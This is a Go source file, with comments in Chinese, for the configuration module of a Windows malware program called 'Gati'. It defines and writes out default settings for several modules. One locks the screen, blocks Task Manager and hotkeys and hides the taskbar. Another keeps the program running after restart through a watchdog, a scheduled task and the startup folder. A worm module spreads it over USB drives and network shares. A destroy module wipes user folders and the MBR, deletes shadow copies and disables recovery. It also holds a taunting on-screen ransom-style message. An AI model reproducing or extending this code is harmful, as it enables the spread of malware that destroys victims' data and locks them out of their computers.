//go:build windows

package main

import (
	"bufio"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// Config 是整个程序的行为开关。所有值都从 gati.ini 读，改文件即改行为。
type Config struct {
	// [display]
	TextFile    string
	WindowCount int
	FontName    string
	FontSize    int
	FgColor     string
	BgColor     string
	Mode        string // static | scroll
	ScrollSpeed int
	Blink       bool
	BlinkMs     int
	ReloadMs    int
	Align       string // center | left | right

	// [lockdown]
	BlockTaskmgr bool
	BlockHotkeys bool
	HideTaskbar  bool

	// [persistence]
	PersistEnabled bool
	Watchdog       bool
	ScheduledTask  bool
	StartupFolder  bool

	// [unlock]
	UnlockHotkey string
	UnlockVK     int
	UnlockCtrl   bool
	UnlockAlt    bool
	UnlockShift  bool

	// [worm]
	WormEnabled    bool
	WormUSB        bool
	WormNetShares  bool
	WormUserDirs   bool
	WormDepth      int
	WormThrottleMs int
	WormName       string
	WormAutorun    bool

	// [destroy]
	DestroyEnabled  bool
	DestroyConfirm  string
	DestroyFiles    bool
	DestroyTargets  []string
	DestroyWipeMBR  bool
	DestroyShadows  bool
	DestroyRecovery bool
	DestroyFillDisk bool
}

type iniFile map[string]string

func loadINI(path string) iniFile {
	m := iniFile{}
	f, err := os.Open(path)
	if err != nil {
		return m
	}
	defer f.Close()

	section := ""
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*64), 1024*1024)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, ";") || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			section = strings.ToLower(strings.TrimSpace(line[1 : len(line)-1]))
			continue
		}
		idx := strings.IndexAny(line, "=:")
		if idx < 0 {
			continue
		}
		k := strings.ToLower(strings.TrimSpace(line[:idx]))
		v := strings.TrimSpace(line[idx+1:])
		// 去掉行尾注释
		if i := strings.Index(v, " ;"); i > 0 {
			v = strings.TrimSpace(v[:i])
		}
		m[section+"."+k] = v
	}
	return m
}

func (m iniFile) str(key, def string) string {
	if v, ok := m[key]; ok && v != "" {
		return v
	}
	return def
}

func (m iniFile) integer(key string, def int) int {
	if v, ok := m[key]; ok {
		if n, err := strconv.Atoi(strings.TrimSpace(v)); err == nil {
			return n
		}
	}
	return def
}

func (m iniFile) boolean(key string, def bool) bool {
	v, ok := m[key]
	if !ok {
		return def
	}
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "1", "true", "yes", "on", "y", "是", "开":
		return true
	case "0", "false", "no", "off", "n", "否", "关":
		return false
	}
	return def
}

// loadConfig 从 ini 文件构建 Config
func loadConfig(path string) *Config {
	m := loadINI(path)

	c := &Config{}
	c.TextFile = m.str("display.text_file", "gati_text.txt")
	c.WindowCount = m.integer("display.window_count", 2)
	c.FontName = m.str("display.font_name", "Microsoft YaHei")
	c.FontSize = m.integer("display.font_size", 96)
	c.FgColor = m.str("display.fg_color", "FF2D2D")
	c.BgColor = m.str("display.bg_color", "000000")
	c.Mode = strings.ToLower(m.str("display.mode", "static"))
	c.ScrollSpeed = m.integer("display.scroll_speed", 3)
	c.Blink = m.boolean("display.blink", false)
	c.BlinkMs = m.integer("display.blink_ms", 500)
	c.ReloadMs = m.integer("display.reload_ms", 1000)
	c.Align = strings.ToLower(m.str("display.align", "center"))

	c.BlockTaskmgr = m.boolean("lockdown.block_taskmgr", true)
	c.BlockHotkeys = m.boolean("lockdown.block_hotkeys", true)
	c.HideTaskbar = m.boolean("lockdown.hide_taskbar", true)

	c.PersistEnabled = m.boolean("persistence.enabled", true)
	c.Watchdog = m.boolean("persistence.watchdog", true)
	c.ScheduledTask = m.boolean("persistence.scheduled_task", true)
	c.StartupFolder = m.boolean("persistence.startup_folder", true)

	c.UnlockHotkey = m.str("unlock.hotkey", "Ctrl+Alt+Shift+G")
	parseHotkey(c, c.UnlockHotkey)

	c.WormEnabled = m.boolean("worm.enabled", false)
	c.WormUSB = m.boolean("worm.usb", true)
	c.WormNetShares = m.boolean("worm.net_shares", true)
	c.WormUserDirs = m.boolean("worm.user_dirs", true)
	c.WormDepth = m.integer("worm.depth", 3)
	c.WormThrottleMs = m.integer("worm.throttle_ms", 500)
	c.WormName = m.str("worm.exe_name", "Gati.exe")
	c.WormAutorun = m.boolean("worm.write_autorun", false)

	c.DestroyEnabled = m.boolean("destroy.enabled", false)
	c.DestroyConfirm = m.str("destroy.confirm", "")
	c.DestroyFiles = m.boolean("destroy.wipe_files", true)
	c.DestroyWipeMBR = m.boolean("destroy.wipe_mbr", true)
	c.DestroyShadows = m.boolean("destroy.delete_shadows", true)
	c.DestroyRecovery = m.boolean("destroy.disable_recovery", true)
	c.DestroyFillDisk = m.boolean("destroy.fill_disk", false)

	t := m.str("destroy.targets", "%USERPROFILE%\\Documents,%USERPROFILE%\\Desktop,%USERPROFILE%\\Pictures")
	for _, p := range strings.Split(t, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			c.DestroyTargets = append(c.DestroyTargets, expandEnv(p))
		}
	}

	if c.WindowCount < 1 {
		c.WindowCount = 1
	}
	if c.WindowCount > 8 {
		c.WindowCount = 8
	}
	if c.FontSize < 12 {
		c.FontSize = 12
	}
	if c.FontSize > 400 {
		c.FontSize = 400
	}
	if c.WormDepth < 1 {
		c.WormDepth = 1
	}
	if c.WormDepth > 8 {
		c.WormDepth = 8
	}
	if c.ReloadMs < 200 {
		c.ReloadMs = 200
	}
	return c
}

// parseHotkey 解析 "Ctrl+Alt+Shift+G" 这种写法
func parseHotkey(c *Config, s string) {
	c.UnlockVK = int('G')
	c.UnlockCtrl, c.UnlockAlt, c.UnlockShift = true, true, true
	if strings.TrimSpace(s) == "" {
		return
	}
	parts := strings.Split(s, "+")
	c.UnlockCtrl, c.UnlockAlt, c.UnlockShift = false, false, false
	for _, raw := range parts {
		p := strings.ToLower(strings.TrimSpace(raw))
		switch p {
		case "ctrl", "control":
			c.UnlockCtrl = true
		case "alt":
			c.UnlockAlt = true
		case "shift":
			c.UnlockShift = true
		default:
			if len(raw) == 1 {
				ch := strings.ToUpper(raw)[0]
				c.UnlockVK = int(ch)
			} else {
				switch p {
				case "f1":
					c.UnlockVK = 0x70
				case "f2":
					c.UnlockVK = 0x71
				case "f3":
					c.UnlockVK = 0x72
				case "f5":
					c.UnlockVK = 0x74
				case "f9":
					c.UnlockVK = 0x78
				case "f10":
					c.UnlockVK = 0x79
				case "f11":
					c.UnlockVK = 0x7A
				case "f12":
					c.UnlockVK = 0x7B
				}
			}
		}
	}
}

func expandEnv(s string) string {
	out := ""
	i := 0
	for i < len(s) {
		if s[i] == '%' {
			j := strings.IndexByte(s[i+1:], '%')
			if j >= 0 {
				name := s[i+1 : i+1+j]
				out += os.Getenv(name)
				i = i + j + 2
				continue
			}
		}
		out += string(s[i])
		i++
	}
	return out
}

// hexColor 读 "RRGGBB" 或 "#RRGGBB"
func hexColor(s string, def uint32) uint32 {
	s = strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(s), "#"))
	if len(s) != 6 {
		return def
	}
	n, err := strconv.ParseUint(s, 16, 32)
	if err != nil {
		return def
	}
	return uint32(n)
}

// defaultINI 首次运行时写出的默认配置
const defaultINI = `; ============================================================
; Gati 配置文件
; 改这个文件就能改程序行为。改完关掉全部 Gati 进程重跑一次生效。
; 说明:true=开 / false=关
; ============================================================

[display]
; 显示文字的来源文件(可随时编辑,程序会自动重新读)
text_file=gati_text.txt
; 铺几块屏幕窗口(1~8),多块会横向铺满整个桌面
window_count=2
font_name=Microsoft YaHei
font_size=96
; 颜色是 RRGGBB,不用加 #
fg_color=FF2D2D
bg_color=000000
; static=静止居中, scroll=从下往上滚动
mode=static
scroll_speed=3
; 闪烁效果
blink=false
blink_ms=500
; 多久重新读一次文字文件(毫秒)
reload_ms=1000
; 对齐:center / left / right
align=center

[lockdown]
; 禁用任务管理器
block_taskmgr=true
; 拦 Alt+F4 / Alt+Tab / Win 键 / Ctrl+Esc 等
block_hotkeys=true
; 藏掉任务栏
hide_taskbar=true

[persistence]
; 开机自启
enabled=true
; 双进程互保(关掉一个另一个会把它拉起来)
watchdog=true
; 计划任务方式自启
scheduled_task=true
; 启动文件夹方式自启
startup_folder=true

[unlock]
; 紧急解锁热键,按下后自动清理并退出
hotkey=Ctrl+Alt+Shift+G

[worm]
; ===== 传播模块:默认关闭 =====
enabled=false
usb=true
net_shares=true
user_dirs=true
; 往盘里/共享里钻几层目录
depth=3
; 每次复制之间歇多久(毫秒),别把磁盘搞满
throttle_ms=500
exe_name=Gati.exe
; 往U盘写 autorun.inf(新系统基本不认,老系统有效)
write_autorun=false

[destroy]
; ===== 破坏模块:默认关闭,打开需要同时填 confirm =====
enabled=false
; 必须一字不差填: DELETE-EVERYTHING
confirm=
wipe_files=true
; 要清空的目录,逗号分隔,支持 %USERPROFILE% 这种环境变量
targets=%USERPROFILE%\Documents,%USERPROFILE%\Desktop,%USERPROFILE%\Pictures
wipe_mbr=true
delete_shadows=true
disable_recovery=true
fill_disk=false
`

const defaultText = `你中招了。

这台电脑现在归 Gati 管。

别急着关我 —— 关不掉的。

想恢复？看说明书第 9 章。

或者按 Ctrl + Alt + Shift + G
`

func configDir() string {
	if d := os.Getenv("APPDATA"); d != "" {
		return filepath.Join(d, "Gati")
	}
	return filepath.Join(os.TempDir(), "Gati")
}
